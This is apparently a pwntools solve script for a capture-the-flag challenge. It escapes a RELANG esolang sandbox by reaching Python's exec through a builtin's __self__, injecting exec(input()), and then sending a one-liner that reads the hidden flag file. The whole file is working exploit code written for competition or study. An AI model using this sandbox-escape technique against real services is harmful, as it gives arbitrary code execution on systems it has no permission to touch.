#!/usr/bin/env python3
"""Solve script for the 'stacked' misc challenge.

The challenge runs a RELANG esolang sandbox over TCP.  By abusing getattr
access on built-in objects we can reach ``exec``, inject ``exec(input())``,
and then send arbitrary Python code through the second prompt to read the
hidden flag file.

Exploit flow
------------
1. Send a RELANG payload that resolves ``exec`` from builtins and calls
   ``exec(input())``.
2. ``input()`` inside the running ``exec`` now reads our next line from
   stdin, so we send a Python one-liner that prints the flag.
3. The interpreter captures the Python-level stdout via ``redirect_stdout``
   and echoes it back, giving us the flag.
"""

from __future__ import annotations

import argparse
import re
import sys
import time

from pwn import log, remote  # type: ignore[import]

# ---------------------------------------------------------------------------
# RELANG payload
# ---------------------------------------------------------------------------

# Reaches exec through any.__class__.__mro__[1].__subclasses__() is NOT the
# path here; instead the server enables can_getattr=True so attribute access
# works directly.
#
# Breakdown (see WRITEUP.md):
#   ¤ op µ any          → get attribute 'op' of function 'any'  (builtin method)
#   ¤ " __self__ …      → .  __self__  → builtins module
#   ¤ " exec   …        → .  exec      → exec builtin
#   @ µ str § exec\(input\(\)\)   → str("exec(input())")  → the argument
#   @ ; …               → map ';' (skip/call) with exec over the string
RELANG_EXEC_INPUT = (
    '@ ; ¤ 0 @ µ Operator @ ¤ " exec ¤ " __self__ ¤ op µ any'
    r" @ µ str § exec\(input\(\)\)"
)

# The Python one-liner that exec() will run after reading our second line.
PYTHON_PAYLOAD = "print(open('a_very_well_hidden_flag.txt').read())"


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments.

    Returns:
        Parsed namespace with host, port, and verbose flag.
    """
    parser = argparse.ArgumentParser(
        description=(
            "Exploit the 'stacked' RELANG sandbox to read the hidden flag "
            "via a two-stage exec(input()) injection."
        ),
    )
    parser.add_argument(
        "host",
        nargs="?",
        default="127.0.0.1",
        help="Target host (default: 127.0.0.1)",
    )
    parser.add_argument(
        "port",
        nargs="?",
        type=int,
        default=1337,
        help="Target port (default: 1337)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        default=False,
        help="Enable pwntools debug output",
    )
    return parser.parse_args()


def exploit(host: str, port: int, *, verbose: bool = False) -> str:
    """Run the exploit against the remote RELANG sandbox.

    Args:
        host: IP address or hostname of the challenge server.
        port: TCP port of the challenge server.
        verbose: When *True* pwntools will print raw I/O bytes.

    Returns:
        The flag string extracted from the server response.

    Raises:
        SystemExit: If the flag cannot be found in the server output.
    """
    context_level = "debug" if verbose else "error"

    from pwn import context  # type: ignore[import]

    context.log_level = context_level

    progress = log.progress("Connecting")
    io = remote(host, port)
    progress.success(f"{host}:{port}")

    # --- Step 1: wait for the banner, then send the RELANG payload ----------
    log.info("Waiting for banner…")
    io.recvuntil(b"sandbox !")
    io.recvuntil(b"> ")  # first prompt after "Loading sandbox..."

    log.info("Sending RELANG exec(input()) payload…")
    io.sendline(RELANG_EXEC_INPUT.encode())

    # The server has a sleep(0.5) between each iteration; exec(input()) is
    # called inside the first iteration's run(), so we wait just long enough
    # for the interpreter to reach that inner input() call.
    time.sleep(0.6)

    # --- Step 2: send the Python one-liner -----------------------------------
    log.info("Sending Python payload: %s", PYTHON_PAYLOAD)
    io.sendline(PYTHON_PAYLOAD.encode())

    # Collect whatever the server sends back after running our payload.
    response = io.recvall(timeout=4).decode(errors="replace")
    io.close()

    log.debug("Raw response: %r", response)

    match = re.search(r"\w+CTF\{[^}]+\}", response)
    if match:
        return match.group(0)

    # If no CTF{} pattern, return the full stripped response so the caller
    # still has something useful.
    stripped = response.strip()
    if stripped:
        return stripped

    log.error("Flag not found in server response:\n%s", response)
    sys.exit(1)


def main() -> None:
    """Entry point: parse arguments, run exploit, print the flag."""
    args = parse_args()
    flag = exploit(args.host, args.port, verbose=args.verbose)
    log.success("Flag: %s", flag)
    print(flag)


if __name__ == "__main__":
    main()
